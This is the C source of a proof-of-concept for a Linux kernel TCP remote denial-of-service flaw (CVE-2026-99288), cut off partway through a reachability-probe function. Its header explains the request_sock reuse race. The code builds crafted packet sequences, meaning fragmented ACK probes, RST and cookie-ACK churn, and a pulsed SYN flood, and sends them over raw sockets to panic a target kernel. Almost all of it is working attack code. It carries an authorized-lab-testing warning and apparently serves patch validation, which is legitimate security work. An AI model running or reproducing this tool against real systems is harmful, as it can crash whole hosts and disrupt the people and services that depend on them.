/*
 * NoisyTCP PoC  --  CVE-2026-99288  (Linux kernel TCP pre-auth remote DoS)
 * =====================================================================
 *
 * Trigger flow #1 from the advisory: "request_sock Reuse ABA Race".
 *
 * Mechanism (see README.md for the full write-up):
 *
 *   __inet_lookup_established() walks the TCP ehash locklessly. The
 *   request_sock slab is SLAB_TYPESAFE_BY_RCU, so a freed object can be
 *   re-allocated while an RCU reader still holds its old address. Before
 *   the fix (4e2b3ef19e0e) the lookup re-checked the tuple after taking a
 *   reference but did NOT check whether the object was still hashed.
 *
 *   Race, per 4-tuple T:
 *     CPU A: a packet for T finds a *hashed* syn_recv request R_old in the
 *            ehash bucket, passes the first inet_match(), and is about to
 *            take a reference.
 *     CPU B: R_old is freed and the SAME slab address is re-allocated as a
 *            SYN-cookie request R_new for the SAME tuple T. R_new is
 *            unhashed and has rsk_listener == NULL; tcp_get_cookie_sock()
 *            publishes refcount 1 on it.
 *     CPU A: refcount_inc_not_zero() succeeds on R_new, the tuple re-check
 *            passes (same tuple), and the lookup returns R_new.
 *     tcp_v4_rcv() sees sk_state == TCP_NEW_SYN_RECV, reads
 *            sk = req->rsk_listener  (NULL)  and dereferences it ->
 *            NULL-pointer oops in softirq -> kernel panic (whole host).
 *
 *   To put the two packets of the SAME tuple on DIFFERENT RX contexts we
 *   exploit the receive-hash difference between IPv4 fragments (L3 hash)
 *   and plain TCP packets (L4 Toeplitz hash). Requires >= 2 RX queues or
 *   RPS on the target. SYN cookies must be active (default) so the cookie
 *   path allocates the NULL-listener request.
 *
 *   Packet recipe per tuple T = (src:sport -> dst:dport), client ISN = X:
 *     SYN(T, seq=X)                  -> creates hashed R_old (queue room)
 *     fragmented ACK(T, ack=0)       -> CPU A stale-lookup probes
 *     RST(T, seq=X+1, no ACK)        -> CPU B frees R_old (embryonic_reset)
 *     ACK(T, seq=X+1, ack=cookie+1)  -> CPU B re-allocs cookie req R_new
 *     RST(T, seq=X+1)                -> CPU B cleans up the child socket
 *   A SYN flood (pulsed) drives syncookies on and creates queue oscillation.
 *
 * IMPORTANT -- AUTHORIZED LAB TESTING ONLY.
 *   This tool crashes the target kernel (remote DoS). It is a validation
 *   harness for a publicly disclosed CVE, intended to confirm exposure and
 *   verify the patch / mitigations on systems you own or are explicitly
 *   authorized to test. It sends from a real, attributable source address
 *   to a single named target. It does not scan, spread, spoof, or evade.
 *   Running it against a system you do not control is illegal.
 *
 * Build:  make            (or: nix-shell -p gcc gnumake --run make)
 * Run:    sudo ./noisytcp --iface eth0 --target 10.0.0.2 --port 80 \
 *                         --authorize I-OWN-THIS-TARGET
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <pthread.h>
#include <stdatomic.h>
#include <getopt.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <poll.h>
#include <sched.h>

/* ------------------------------------------------------------------ */
/* Limits and tunables                                                 */
/* ------------------------------------------------------------------ */
#define FRAME_MAX      256
#define BATCH_MAX      128
#define MAX_TUPLES     256
#define MAX_RACE_THREADS 64
#define ARP_TIMEOUT_MS 3000
#define COOKIE_REFRESH_MS 45000   /* re-confirm cookie well inside ~2min window */

struct race_tuple {
    uint16_t sport;
    uint32_t isn;                 /* X, fixed per tuple                    */
    _Atomic uint32_t cookie;      /* C, captured from SYN-ACK (seq)        */
    _Atomic uint32_t last_seq;    /* last SYN-ACK seq seen (cookie detect) */
    _Atomic int      cookie_ok;   /* seen same seq twice -> stable cookie  */
    _Atomic uint64_t last_cookie_ms;
    _Atomic uint64_t cycles;
};

struct config {
    char     iface[IFNAMSIZ];
    uint32_t src_ip;
    uint32_t dst_ip;
    uint16_t dport;
    uint8_t  src_mac[6];
    uint8_t  dst_mac[6];
    int      ifindex;

    int      tuples;              /* number of race tuples                 */
    uint16_t base_sport;          /* race sports: base_sport .. +tuples    */
    uint16_t flood_sport;         /* flood sports start (separate range)   */
    int      flood_sports;        /* number of flood source ports          */

    int      flood_pps;           /* SYN flood rate (per flood thread)     */
    int      flood_threads;       /* number of SYN flood threads           */
    int      race_pps;            /* probe rate per race thread            */
    int      race_threads;        /* number of race worker threads         */
    int      pulse_ms;            /* flood gate period; 0 = always on      */
    int      duration_s;          /* 0 = run until Ctrl-C                  */
    int      burst;               /* fragmented probes per cycle (1..6)    */
    int      mss;                 /* MSS advertised in SYN (cookie mssind) */
    int      nofrag;              /* disable fragmentation (debug)         */
    int      pin;                 /* pin workers to distinct CPUs          */

    int      l3;                  /* 1 = routed raw-IP TX, 0 = AF_PACKET L2 */
    int      force_l3;
    int      force_l2;

    int      dry_run;
    int      selftest;
    int      probe;
    int      authorized;
};

static struct config cfg = {
    .tuples = 8, .base_sport = 40000, .flood_sport = 50000, .flood_sports = 2048,
    .flood_pps = 20000, .flood_threads = 1, .race_pps = 20000, .race_threads = 4, .pulse_ms = 400,
    .duration_s = 0, .burst = 3, .mss = 1460,
};

static struct race_tuple rt[MAX_TUPLES];
static _Atomic int flood_on = 1;
static _Atomic int running = 1;
static _Atomic uint64_t tx_total, flood_tx, race_tx, synack_rx, cookie_hits;
static int rx_sock = -1;
static int ncpu = 1;
static struct sockaddr_ll tx_sa;
static struct sockaddr_in tx_sin;

/* forward decls (socket helpers are defined below the worker threads) */
static int open_tx_socket(void);

/* ------------------------------------------------------------------ */
/* Time helpers                                                        */
/* ------------------------------------------------------------------ */
static uint64_t now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static void sleep_ms(int ms)
{
    struct timespec ts = { .tv_sec = ms / 1000, .tv_nsec = (long)(ms % 1000) * 1000000 };
    nanosleep(&ts, NULL);
}

/* Fast thread-local PRNG (xorshift32) for hot packet paths. */
static _Thread_local uint32_t rng_s;
static uint32_t rng32(void)
{
    uint32_t x = rng_s;
    if (!x) x = 0x9e3779b9u ^ (uint32_t)(uintptr_t)&x ^ (uint32_t)now_ms();
    x ^= x << 13; x ^= x >> 17; x ^= x << 5;
    rng_s = x;
    return x;
}

/* ------------------------------------------------------------------ */
/* Checksums                                                           */
/* ------------------------------------------------------------------ */
static uint16_t csum(const void *data, int len)
{
    const uint16_t *p = data;
    uint32_t sum = 0;
    while (len > 1) { sum += *p++; len -= 2; }
    if (len) sum += *(const uint8_t *)p;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)~sum;
}

struct pseudo4 {
    uint32_t saddr, daddr;
    uint8_t  zero, proto;
    uint16_t len;
};

static uint16_t tcp4_csum(uint32_t saddr, uint32_t daddr,
                          const struct tcphdr *th, int tcp_len)
{
    struct pseudo4 ps = {
        .saddr = saddr, .daddr = daddr,
        .zero = 0, .proto = IPPROTO_TCP, .len = htons(tcp_len),
    };
    uint8_t buf[FRAME_MAX];
    memcpy(buf, &ps, sizeof(ps));
    memcpy(buf + sizeof(ps), th, tcp_len);
    return csum(buf, sizeof(ps) + tcp_len);
}

/* ------------------------------------------------------------------ */
/* Packet builders. All produce a full Ethernet frame in `out`.        */
/* Returns frame length. `ipid` lets fragments share an id.            */
/* ------------------------------------------------------------------ */
static int build_eth(uint8_t *out, const uint8_t *dst, const uint8_t *src)
{
    if (cfg.l3) return 0;                     /* routed raw-IP: no L2 header */
    memcpy(out, dst, 6);
    memcpy(out + 6, src, 6);
    out[12] = 0x08; out[13] = 0x00;          /* ETH_P_IP */
    return ETHER_HDR_LEN;
}

/* Build IP+TCP into out (no Ethernet yet). Returns IP total length. */
static int build_ip_tcp(uint8_t *out, uint16_t sport, uint16_t dport,
                        uint32_t seq, uint32_t ack, uint8_t flags,
                        const uint8_t *tcp_opts, int opts_len,
                        const uint8_t *payload, int payload_len,
                        uint16_t ipid, uint16_t frag_off_flags)
{
    struct iphdr *ip = (struct iphdr *)out;
    int tcp_len = sizeof(struct tcphdr) + opts_len + payload_len;
    int ip_len = sizeof(struct iphdr) + tcp_len;

    memset(out, 0, ip_len);
    ip->ihl = 5;
    ip->version = 4;
    ip->tot_len = htons(ip_len);
    ip->id = htons(ipid);
    ip->frag_off = htons(frag_off_flags);
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = cfg.src_ip;
    ip->daddr = cfg.dst_ip;
    ip->check = 0;
    ip->check = csum(ip, sizeof(*ip));

    struct tcphdr *th = (struct tcphdr *)(out + sizeof(*ip));
    th->source = htons(sport);
    th->dest = htons(dport);
    th->seq = htonl(seq);
    th->ack_seq = htonl(ack);
    th->doff = (sizeof(*th) + opts_len) / 4;
    th->window = htons(65535);
    /* flags */
    if (flags & TH_SYN) th->syn = 1;
    if (flags & TH_ACK) th->ack = 1;
    if (flags & TH_RST) th->rst = 1;
    if (flags & TH_FIN) th->fin = 1;
    if (tcp_opts && opts_len)
        memcpy((uint8_t *)th + sizeof(*th), tcp_opts, opts_len);
    if (payload && payload_len)
        memcpy((uint8_t *)th + sizeof(*th) + opts_len, payload, payload_len);
    th->check = 0;
    th->check = tcp4_csum(cfg.src_ip, cfg.dst_ip, th, tcp_len);
    return ip_len;
}

/* MSS option (kind=2,len=4,value) */
static int mss_option(uint8_t *opt, uint16_t mss)
{
    opt[0] = 2; opt[1] = 4;
    uint16_t m = htons(mss);
    memcpy(opt + 2, &m, 2);
    return 4;
}

/* Wrap an IP datagram (already built at out+ETHER_HDR_LEN) into a frame. */
static int frame_single(uint8_t *out, uint16_t sport, uint32_t seq, uint32_t ack,
                        uint8_t flags, const uint8_t *opts, int opts_len,
                        const uint8_t *payload, int payload_len, uint16_t ipid)
{
    int n = build_eth(out, cfg.dst_mac, cfg.src_mac);
    n += build_ip_tcp(out + n, sport, cfg.dport, seq, ack, flags,
                      opts, opts_len, payload, payload_len, ipid, 0);
    return n;
}

/*
 * Fragment an IP+TCP datagram into two Ethernet frames.
 * First fragment carries only 8 bytes of IP payload (MF=1, offset 0) so no
 * complete L4 header is present -> NIC/RPS uses the L3 hash. The second
 * fragment carries the rest (offset = 1). The target reassembles before TCP
 * processing. `out` must hold two FRAME_MAX buffers back to back.
 * Returns number of frames (2).
 */
static int frame_frag(uint8_t *out, uint16_t sport, uint32_t seq, uint32_t ack,
                      uint8_t flags, const uint8_t *opts, int opts_len,
                      const uint8_t *payload, int payload_len,
                      uint16_t ipid, int first)
{
    uint8_t datagram[FRAME_MAX];
    int ip_len = build_ip_tcp(datagram, sport, cfg.dport, seq, ack, flags,
                              opts, opts_len, payload, payload_len, ipid, 0);
    int ip_payload = ip_len - (int)sizeof(struct iphdr);
    if (first < 8) first = 8;
    if (first > 64 || (first & 7)) first = 8;
    if (ip_payload <= first) {                  /* too small: send unfragmented */
        int n = build_eth(out, cfg.dst_mac, cfg.src_mac);
        memcpy(out + n, datagram, ip_len);
        return 1;
    }

    /* fragment 1: IP header + first 8 payload bytes, MF set */
    int n1 = build_eth(out, cfg.dst_mac, cfg.src_mac);
    struct iphdr *ip1 = (struct iphdr *)(out + n1);
    memcpy(ip1, datagram, sizeof(*ip1));
    memcpy(out + n1 + sizeof(*ip1), datagram + sizeof(*ip1), first);
    ip1->tot_len = htons(sizeof(*ip1) + first);
    ip1->frag_off = htons(IP_MF);               /* offset 0, more fragments */
    ip1->check = 0; ip1->check = csum(ip1, sizeof(*ip1));

    /* fragment 2: IP header + remaining payload, offset = first/8 */
    uint8_t *f2 = out + FRAME_MAX;
    int n2 = build_eth(f2, cfg.dst_mac, cfg.src_mac);
    struct iphdr *ip2 = (struct iphdr *)(f2 + n2);
    memcpy(ip2, datagram, sizeof(*ip1));
    int rest = ip_payload - first;
    memcpy(f2 + n2 + sizeof(*ip2), datagram + sizeof(*ip1) + first, rest);
    ip2->tot_len = htons(sizeof(*ip2) + rest);
    ip2->frag_off = htons(first / 8);           /* offset in 8-byte units, MF=0 */
    ip2->check = 0; ip2->check = csum(ip2, sizeof(*ip2));

    /* frame lengths are recovered from the IP headers by frame_frag_len(). */
    return 2;
}

/* Same as frame_frag but reports the two frame lengths. */
static int frame_frag_len(uint8_t *out, int *len1, int *len2,
                          uint16_t sport, uint32_t seq, uint32_t ack,
                          uint8_t flags, const uint8_t *opts, int opts_len,
                          const uint8_t *payload, int payload_len,
                          uint16_t ipid, int first)
{
    int nf = frame_frag(out, sport, seq, ack, flags, opts, opts_len,
                        payload, payload_len, ipid, first);
    int hl = cfg.l3 ? 0 : ETHER_HDR_LEN;
    if (nf == 1) {
        struct iphdr *ip = (struct iphdr *)(out + hl);
        *len1 = hl + ntohs(ip->tot_len);
        *len2 = 0;
        return 1;
    }
    struct iphdr *ip1 = (struct iphdr *)(out + hl);
    struct iphdr *ip2 = (struct iphdr *)(out + FRAME_MAX + hl);
    *len1 = hl + ntohs(ip1->tot_len);
    *len2 = hl + ntohs(ip2->tot_len);
    return 2;
}

/* ------------------------------------------------------------------ */
/* TX: batched sendmmsg over AF_PACKET                                 */
/* ------------------------------------------------------------------ */
struct framebuf { uint8_t data[FRAME_MAX]; int len; };

static int send_batch(int sock, struct framebuf *fb, int n)
{
    if (cfg.dry_run || n <= 0) return n;
    struct mmsghdr msg[BATCH_MAX];
    struct iovec iov[BATCH_MAX];
    memset(msg, 0, sizeof(msg));
    for (int i = 0; i < n; i++) {
        iov[i].iov_base = fb[i].data;
        iov[i].iov_len = fb[i].len;
        msg[i].msg_hdr.msg_iov = &iov[i];
        msg[i].msg_hdr.msg_iovlen = 1;
        if (cfg.l3) {
            msg[i].msg_hdr.msg_name = &tx_sin;
            msg[i].msg_hdr.msg_namelen = sizeof(tx_sin);
        } else {
            msg[i].msg_hdr.msg_name = &tx_sa;
            msg[i].msg_hdr.msg_namelen = sizeof(tx_sa);
        }
    }
    int sent = sendmmsg(sock, msg, n, 0);
    if (sent < 0) {
        if (errno == ENOBUFS || errno == EAGAIN) { sleep_ms(1); return 0; }
        return 0;
    }
    atomic_fetch_add(&tx_total, sent);
    return sent;
}

/* ------------------------------------------------------------------ */
/* RX: cookie capture (and ARP during resolution)                      */
/* ------------------------------------------------------------------ */
static void rx_handle_tcp(const uint8_t *ip_pkt, int ip_len)
{
    const struct iphdr *ip = (const struct iphdr *)ip_pkt;
    if (ip->protocol != IPPROTO_TCP) return;
    if (ip->saddr != cfg.dst_ip) return;
    int ihl = ip->ihl * 4;
    if (ip_len < ihl + (int)sizeof(struct tcphdr)) return;
    const struct tcphdr *th = (const struct tcphdr *)(ip_pkt + ihl);
    if (!th->syn || !th->ack) return;           /* only SYN-ACK */
    if (ntohs(th->source) != cfg.dport) return; /* server source = target port */
    uint16_t sport = ntohs(th->dest);           /* server dest = our sport */
    uint32_t seq = ntohl(th->seq);

    /* find matching race tuple by sport */
    for (int i = 0; i < cfg.tuples; i++) {
        if (rt[i].sport != sport) continue;
        atomic_fetch_add(&synack_rx, 1);
        if (!atomic_load(&flood_on)) break;     /* only trust cookies under flood */
        uint32_t prev = atomic_load(&rt[i].last_seq);
        if (prev == seq && seq != 0) {
            atomic_store(&rt[i].cookie, seq);
            atomic_store(&rt[i].cookie_ok, 1);
            atomic_store(&rt[i].last_cookie_ms, now_ms());
            atomic_fetch_add(&cookie_hits, 1);
        } else {
            atomic_store(&rt[i].last_seq, seq);
        }
        break;
    }
}

static void *rx_thread(void *arg)
{
    (void)arg;
    uint8_t buf[2048];
    while (atomic_load(&running)) {
        if (cfg.dry_run || rx_sock < 0) { sleep_ms(50); continue; }
        ssize_t n = recv(rx_sock, buf, sizeof(buf), 0);
        if (n < (ssize_t)(ETHER_HDR_LEN + sizeof(struct iphdr))) continue;
        uint16_t et = (buf[12] << 8) | buf[13];
        if (et != ETH_P_IP) continue;
        rx_handle_tcp(buf + ETHER_HDR_LEN, n - ETHER_HDR_LEN);
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/* Flood thread: SYN flood to drive syncookies + queue oscillation     */
/* ------------------------------------------------------------------ */
static void pin_to(int cpu)
{
    if (!cfg.pin || cpu < 0) return;
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu % ncpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) < 0)
        fprintf(stderr, "[pin] cpu %d: %s\n", cpu % ncpu, strerror(errno));
}

static void *flood_thread(void *arg)
{
    int tid = arg ? *(int *)arg : 0;
    pin_to(ncpu - 1 - tid);
    struct framebuf fb[BATCH_MAX];
    uint8_t opts[4];
    int opts_len = mss_option(opts, cfg.mss);
    uint16_t ipid = 1000;
    uint32_t isn = 0x10000000;
    int sock = cfg.dry_run ? -1 : open_tx_socket();
    if (!cfg.dry_run && sock < 0) {
        fprintf(stderr, "[flood] TX socket failed: %s\n", strerror(errno));
        return NULL;
    }

    while (atomic_load(&running)) {
        if (!atomic_load(&flood_on)) { sleep_ms(2); continue; }
        int n = 0;
        for (int i = 0; i < BATCH_MAX; i++) {
            uint16_t sp = cfg.flood_sport + (rng32() % cfg.flood_sports);
            isn += 64000 + (rng32() & 0xffff);
            fb[n].len = frame_single(fb[n].data, sp, isn, 0, TH_SYN,
                                     opts, opts_len, NULL, 0, ipid++);
            n++;
        }
        int s = send_batch(sock, fb, n);
        atomic_fetch_add(&flood_tx, s);
        if (cfg.flood_pps > 0 && s > 0) {
            int us = (int)((uint64_t)s * 1000000 / (uint64_t)cfg.flood_pps);
            if (us > 0) usleep(us);
        }
    }
    if (sock >= 0) close(sock);
    return NULL;
}

/* ------------------------------------------------------------------ */
/* Race thread: the ABA cycle for a set of tuples                      */
/* ------------------------------------------------------------------ */
/*
 * Emit a small bounded chunk (<= ~10 frames) for one tuple so the sender can
 * round-robin across many tuples per batch. Uses t->cycles as a phase counter:
 *   - every call: a few fragmented CPU-A stale-lookup probes
 *   - phase 0   : SYN to (re)create hashed R_old
 *   - phase 4   : CPU-B churn  RST(free R_old) + cookieACK(realloc R_new) + RST
 * The probes emitted alongside the churn are the ones that race it.
 */
static void race_one_cycle(int idx, struct framebuf *fb, int *n)
{
    struct race_tuple *t = &rt[idx];
    uint16_t sp = t->sport;
    uint32_t X = t->isn;
    uint32_t C = atomic_load(&t->cookie);
    int have_cookie = atomic_load(&t->cookie_ok);
    uint64_t phase = atomic_load(&t->cycles) % 8;
    uint16_t ipid = (uint16_t)(rng32() & 0xffff);
    uint8_t opts[4];
    int opts_len = mss_option(opts, cfg.mss);
    uint8_t pad[8] = {0};

    /* phase 0: SYN -> create hashed R_old when the syn queue has room. */
    if (phase == 0 && *n < BATCH_MAX) {
        fb[*n].len = frame_single(fb[*n].data, sp, X, 0, TH_SYN,
                                  opts, opts_len, NULL, 0, ipid);
        (*n)++;
    }

    /* CPU A: fragmented stale-lookup probes (invalid ACK keeps R_old alive). */
    int probes = cfg.burst < 1 ? 1 : (cfg.burst > 6 ? 6 : cfg.burst);
    for (int k = 0; k < probes && *n < BATCH_MAX - 2; k++) {
        if (!cfg.nofrag) {
            int l1, l2;
            uint8_t tmp[2 * FRAME_MAX];
            int nf = frame_frag_len(tmp, &l1, &l2, sp, X + 1, 0, TH_ACK,
                                    NULL, 0, pad, sizeof(pad),
                                    (uint16_t)(ipid + k), 8);
            fb[*n].len = l1; memcpy(fb[*n].data, tmp, l1); (*n)++;
            if (nf == 2 && *n < BATCH_MAX) {
                fb[*n].len = l2; memcpy(fb[*n].data, tmp + FRAME_MAX, l2); (*n)++;
            }
        } else {
            fb[*n].len = frame_single(fb[*n].data, sp, X + 1, 0, TH_ACK,
                                      NULL, 0, pad, sizeof(pad), ipid);
            (*n)++;
        }
    }

    /* phase 4: CPU B free R_old then re-alloc a cookie request at same address. */
    if (have_cookie && phase == 4 && *n < BATCH_MAX - 3) {
        /* RST seq=X+1 == rcv_nxt -> embryonic_reset frees R_old. */
        fb[*n].len = frame_single(fb[*n].data, sp, X + 1, 0, TH_RST,
                                  NULL, 0, NULL, 0, ipid);
        (*n)++;
        /* valid cookie ACK -> unhashed NULL-listener request R_new (refcnt 1). */
        fb[*n].len = frame_single(fb[*n].data, sp, X + 1, C + 1, TH_ACK,
                                  NULL, 0, NULL, 0, ipid);
        (*n)++;
        /* RST kills the child created by the cookie ACK, cleaning T. */
        fb[*n].len = frame_single(fb[*n].data, sp, X + 1, 0, TH_RST,
                                  NULL, 0, NULL, 0, ipid);
        (*n)++;
    }
    atomic_fetch_add(&t->cycles, 1);
}

static void *race_thread(void *arg)
{
    int tid = *(int *)arg;
    pin_to(tid);
    struct framebuf fb[BATCH_MAX];
    int sock = cfg.dry_run ? -1 : open_tx_socket();
    if (!cfg.dry_run && sock < 0) {
        fprintf(stderr, "[race %d] TX socket failed: %s\n", tid, strerror(errno));
        return NULL;
    }
    int stride = cfg.race_threads > 0 ? cfg.race_threads : 1;

    while (atomic_load(&running)) {
        int n = 0;
        for (int i = tid; i < cfg.tuples && n < BATCH_MAX - 16; i += stride) {
            /* refresh cookie if stale */
            struct race_tuple *t = &rt[i];
            if (atomic_load(&t->cookie_ok) &&
                now_ms() - atomic_load(&t->last_cookie_ms) > COOKIE_REFRESH_MS) {
                atomic_store(&t->cookie_ok, 0);
                atomic_store(&t->last_seq, 0);
            }
            race_one_cycle(i, fb, &n);
        }
        if (n == 0) { sleep_ms(1); continue; }
        int s = send_batch(sock, fb, n);
        atomic_fetch_add(&race_tx, s);
        /* pace by frames actually sent so each worker holds race_pps and
         * aggregate rate scales with the number of workers. */
        if (cfg.race_pps > 0 && s > 0) {
            int us = (int)((uint64_t)s * 1000000 / (uint64_t)cfg.race_pps);
            if (us > 0) usleep(us);
        }
    }
    if (sock >= 0) close(sock);
    return NULL;
}

/* ------------------------------------------------------------------ */
/* Pulse thread: gate the flood to create syn-queue oscillation        */
/* ------------------------------------------------------------------ */
static void *pulse_thread(void *arg)
{
    (void)arg;
    if (cfg.pulse_ms <= 0) { atomic_store(&flood_on, 1); return NULL; }
    while (atomic_load(&running)) {
        atomic_store(&flood_on, 1);
        sleep_ms(cfg.pulse_ms);
        atomic_store(&flood_on, 0);
        sleep_ms(cfg.pulse_ms / 2);
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/* Stats thread                                                        */
/* ------------------------------------------------------------------ */
static void *stats_thread(void *arg)
{
    (void)arg;
    uint64_t last = 0, start = now_ms();
    while (atomic_load(&running)) {
        sleep_ms(1000);
        uint64_t cur = atomic_load(&tx_total);
        uint64_t el = (now_ms() - start) / 1000;
        int known = 0;
        for (int i = 0; i < cfg.tuples; i++) known += atomic_load(&rt[i].cookie_ok);
        fprintf(stderr,
            "[%4lus] tx=%llu (+%llu/s) flood=%llu race=%llu synack=%llu "
            "cookies=%d/%d flood=%s\n",
            (unsigned long)el, (unsigned long long)cur,
            (unsigned long long)(cur - last),
            (unsigned long long)atomic_load(&flood_tx),
            (unsigned long long)atomic_load(&race_tx),
            (unsigned long long)atomic_load(&synack_rx),
            known, cfg.tuples, atomic_load(&flood_on) ? "on" : "off");
        last = cur;
        if (cfg.duration_s > 0 && el >= (uint64_t)cfg.duration_s) {
            fprintf(stderr, "[*] duration reached, stopping\n");
            atomic_store(&running, 0);
        }
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/* Interface / MAC / ARP resolution                                    */
/* ------------------------------------------------------------------ */

/*
 * Longest-prefix lookup in /proc/net/route. Gives the egress interface and
 * next-hop gateway for `dst`. *gw == 0 means the destination is on-link, i.e.
 * the target sits on the same L2 segment and AF_PACKET/ARP can be used.
 */
static int route_lookup(uint32_t dst, char *ifname, size_t ifname_sz, uint32_t *gw)
{
    FILE *f = fopen("/proc/net/route", "r");
    if (!f) return -1;
    char line[512];
    if (!fgets(line, sizeof(line), f)) { fclose(f); return -1; }

    int found = 0;
    uint32_t best_mask = 0, best_gw = 0;
    char best_if[IFNAMSIZ] = {0};

    while (fgets(line, sizeof(line), f)) {
        char ifc[IFNAMSIZ] = {0};
        unsigned long dest, gwv, flags, mask;
        int nf = sscanf(line, "%15s %lx %lx %lx %*u %*u %*u %lx",
                        ifc, &dest, &gwv, &flags, &mask);
        if (nf != 5) continue;
        if (!(flags & 0x1)) continue;                   /* RTF_UP */
        uint32_t d = (uint32_t)dest, m = (uint32_t)mask;
        if ((dst & m) != d) continue;
        if (!found || m > best_mask) {
            found = 1;
            best_mask = m;
            best_gw = (uint32_t)gwv;
            snprintf(best_if, sizeof(best_if), "%s", ifc);
        }
    }
    fclose(f);
    if (!found) return -1;
    if (ifname && ifname_sz) snprintf(ifname, ifname_sz, "%s", best_if);
    if (gw) *gw = best_gw;
    return 0;
}

static int get_if_info(void)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    memcpy(ifr.ifr_name, cfg.iface, strnlen(cfg.iface, IFNAMSIZ - 1));
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { close(fd); return -1; }
    cfg.ifindex = ifr.ifr_ifindex;
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) { close(fd); return -1; }
    memcpy(cfg.src_mac, ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
    return 0;
}

static int open_packet_socket(int ifindex)
{
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) return -1;
    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = ifindex;
    if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) { close(s); return -1; }
    int one = 1;
    setsockopt(s, SOL_SOCKET, SO_BROADCAST, &one, sizeof(one));
    return s;
}

/*
 * Send-only AF_PACKET socket: protocol 0 disables packet reception, so each
 * worker thread can own a TX socket without RX overhead or shared-socket lock
 * contention. A larger send buffer absorbs bursts and reduces ENOBUFS drops.
 * In routed (L3) mode the socket is a raw IPv4 socket with IP_HDRINCL: the
 * kernel routes each crafted datagram through the next hop, so no MAC/ARP is
 * needed and the target may be many hops away.
 */
static int open_tx_socket(void)
{
    if (cfg.l3) {
        int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (s < 0) return -1;
        int one = 1;
        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
            close(s); return -1;
        }
        int buf = 4 * 1024 * 1024;
        setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
        return s;
    }
    int s = socket(AF_PACKET, SOCK_RAW, 0);
    if (s < 0) return -1;
    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_protocol = 0;
    sa.sll_ifindex = cfg.ifindex;
    if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) { close(s); return -1; }
    int buf = 4 * 1024 * 1024;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
    int one = 1;
    setsockopt(s, SOL_SOCKET, SO_BROADCAST, &one, sizeof(one));
    return s;
}

static int resolve_dst_mac(void)
{
    /* Send ARP who-has dst_ip, wait for reply. */
    uint8_t req[ETHER_HDR_LEN + 28];
    memset(req, 0, sizeof(req));
    memset(req, 0xff, 6);                       /* broadcast dst */
    memcpy(req + 6, cfg.src_mac, 6);
    req[12] = 0x08; req[13] = 0x06;             /* ETH_P_ARP */
    uint8_t *a = req + ETHER_HDR_LEN;
    a[0] = 0; a[1] = 1;                         /* htype ethernet */
    a[2] = 0x08; a[3] = 0;                      /* ptype IPv4 */
    a[4] = 6; a[5] = 4;                         /* hlen, plen */
    a[6] = 0; a[7] = 1;                         /* op request */
    memcpy(a + 8, cfg.src_mac, 6);
    memcpy(a + 14, &cfg.src_ip, 4);
    memset(a + 18, 0, 6);
    memcpy(a + 24, &cfg.dst_ip, 4);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex = cfg.ifindex;
    sa.sll_halen = 6;
    memset(sa.sll_addr, 0xff, 6);

    if (sendto(rx_sock, req, sizeof(req), 0, (struct sockaddr *)&sa, sizeof(sa)) < 0)
        return -1;

    uint64_t deadline = now_ms() + ARP_TIMEOUT_MS;
    uint8_t buf[2048];
    while (now_ms() < deadline) {
        ssize_t n = recv(rx_sock, buf, sizeof(buf), 0);
        if (n < (ssize_t)(ETHER_HDR_LEN + 28)) continue;
        if (buf[12] != 0x08 || buf[13] != 0x06) continue;
        uint8_t *ar = buf + ETHER_HDR_LEN;
        if (ar[6] != 0 || ar[7] != 2) continue; /* reply */
        uint32_t spa; memcpy(&spa, ar + 14, 4);
        if (spa != cfg.dst_ip) continue;
        memcpy(cfg.dst_mac, ar + 8, 6);
        return 0;
    }
    return -1;
}

/*
 * Reachability probe: fire a handful of SYNs and report how many SYN-ACKs come
 * back. `first == 0` sends plain packets; `first > 0` splits each SYN across two
 * IP fragments with that many payload bytes in fragment 1. Splitting at 8 hides
 * the whole L4 header (what the race needs); 32/40 keep the ports visible, which
 * distinguishes "path drops all fragments" from "path drops only short first
 * fragments" (some inspection devices drop those).
 */
static int probe_target(int first, uint16_t p0)
{
    struct framebuf fb[BATCH_MAX];
    uint8_t opts[4];
    int ol = mss_option(opts, cfg.mss);
    int want = 5, n = 0;

    for (int i = 0; i < want && n < BATCH_MAX - 2; i++) {
        uint16_t sp = (uint16_t)(p0 + i);
        uint32_t seq = 0x40000000u + (uint32_t)i * 4099u;
        if (!first) {
